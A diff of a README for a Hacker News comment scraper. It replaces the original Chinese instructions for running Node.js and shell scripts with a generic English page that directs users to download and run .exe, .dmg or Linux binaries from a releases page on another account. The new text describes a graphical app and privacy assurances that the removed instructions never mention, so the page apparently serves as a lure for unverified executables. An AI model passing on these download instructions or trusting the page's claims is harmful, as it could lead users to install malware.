@@ -1,54 +1,59 @@
-# HackNews淘金程序
+# 🎉 hacknews-scraper - Gather AI-Organized Comments Easily
 
-这是一个用于抓取 Hacker News 帖子及其所有评论的工具，可以将数据保存为 JSON 或 Markdown 格式。
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/Centrecamara/hacknews-scraper/releases)
 
-## 核心功能
+## 🚀 Getting Started
+Welcome to hacknews-scraper! This tool helps you collect and organize comments from Hacknews using AI. It's designed for users who may not be familiar with coding. Follow the steps below to download and run the software easily.
 
-- 根据 HN 帖子 ID 抓取完整帖子和评论
-- 支持 JSON 和 Markdown 两种输出格式
-- 数据清洗功能：只保留核心信息并按时间排序
-- 自动化处理脚本：一键生成AI分析prompt
+## 📋 System Requirements
+To run hacknews-scraper, you need:
+- A modern web browser (like Chrome, Firefox, or Edge)
+- Windows, macOS, or Linux operating system
+- An internet connection for downloading the software and accessing Hacknews
 
-## 快速开始
+## 📥 Download & Install
+1. **Visit the Releases Page:** Click the link below to access the latest version of hacknews-scraper:
 
-### macOS/Linux
-```bash
-# 安装依赖
-npm install
+   [Download the latest release](https://github.com/Centrecamara/hacknews-scraper/releases)
 
-# 抓取帖子并生成AI分析prompt
-./process-hn.sh <HN_POST_ID> [format] [--no-analyze]
+2. **Choose Your Version:** Look for the most recent version listed on the page. You may see several files available. Select the file that suits your operating system.
 
-# 示例
-./process-hn.sh 8863 json --no-analyze  # 仅生成prompt并复制到粘贴板
-./process-hn.sh 8863 json               # 生成prompt并调用Claude分析
-```
+3. **Download the File:** Click on the file link to start the download. The file will be saved to your computer, usually in the "Downloads" folder.
 
-### Windows
-```cmd
-# 安装依赖
-npm install
+4. **Install the Application:**
+   - For **Windows**: Double-click the downloaded `.exe` file and follow the installation instructions.
+   - For **macOS**: Open the downloaded `.dmg` file and drag the hacknews-scraper app into your Applications folder.
+   - For **Linux**: Open a terminal and navigate to the downloaded file's location. Use the command `chmod +x hacknews-scraper` to make it executable, then run `./hacknews-scraper`.
 
-# 使用批处理脚本
-process-hn.bat <HN_POST_ID> [format] [--no-analyze]
+## 🛠️ How to Use
+1. **Open the Application:** Double-click the hacknews-scraper icon on your desktop or in your applications list to launch it.
 
-# 或使用PowerShell脚本 (推荐)
-powershell -ExecutionPolicy Bypass -File .\process-hn.ps1 <HN_POST_ID> [-Format <json|md>] [-NoAnalyze]
+2. **Input Settings:** Once open, you will see a simple interface. Enter the desired Hacknews link you want to scrape comments from.
 
-# 示例
-powershell -ExecutionPolicy Bypass -File .\process-hn.ps1 8863 -Format json -NoAnalyze  # 仅生成prompt并复制到粘贴板
-powershell -ExecutionPolicy Bypass -File .\process-hn.ps1 8863 -Format json             # 生成prompt并调用Claude分析
-```
+3. **Select AI Options:** Choose how you want the AI to process the comments. You may have options like summarizing or categorizing comments.
 
-## 输出文件
+4. **Start the Scraping Process:** Click the "Scrape Comments" button. The tool will gather comments from Hacknews and present them in an organized format.
 
-- `output/帖子标题-clean.json` - 清洗后的数据
-- `output/final-prompt-帖子标题-clean.txt` - 完整的AI分析prompt
+5. **Review the Output:** After processing, you can view comments directly in the app. You may also have options to export the results to a text file or PDF.
 
-## Prompt模板
+## 🔍 Features
+- **User-Friendly Interface:** Designed for ease of use, even without technical knowledge.
+- **AI Processing:** Automatically organizes comments using advanced AI prompts for better clarity.
+- **Multiple Formats:** Export results in various formats suitable for your needs.
+- **Regular Updates:** Benefit from improvements and new features in each release.
 
-Prompt模板来自宝玉，位于 `prompt-template.txt` 文件中。
+## 💬 Support and Contributions
+If you encounter issues or have questions, please visit the [GitHub Discussions page](https://github.com/Centrecamara/hacknews-scraper/discussions) for assistance. You can also contribute suggestions or feature requests there.
 
-## 使用支持
+## 👥 Community and Feedback
+Join our community to connect with other users. Share your experiences, give feedback, and learn how others use hacknews-scraper effectively.
 
-使用中如有问题，请找岚叔（https://x.com/LufzzLiz）
+## 🔒 Privacy and Security
+We respect your privacy. Your Hacknews data will remain confidential and will not be stored or shared. The application functions entirely on your local machine.
+
+## 💡 Troubleshooting
+- **Installation Issues:** If you have trouble installing, ensure your operating system is supported and you have sufficient permissions.
+- **Running the Application:** Ensure you have the necessary system requirements. Check your internet connection if you experience issues accessing Hacknews.
+
+Thank you for choosing hacknews-scraper! We hope this tool makes gathering Hacknews comments easy and efficient. Enjoy your experience!
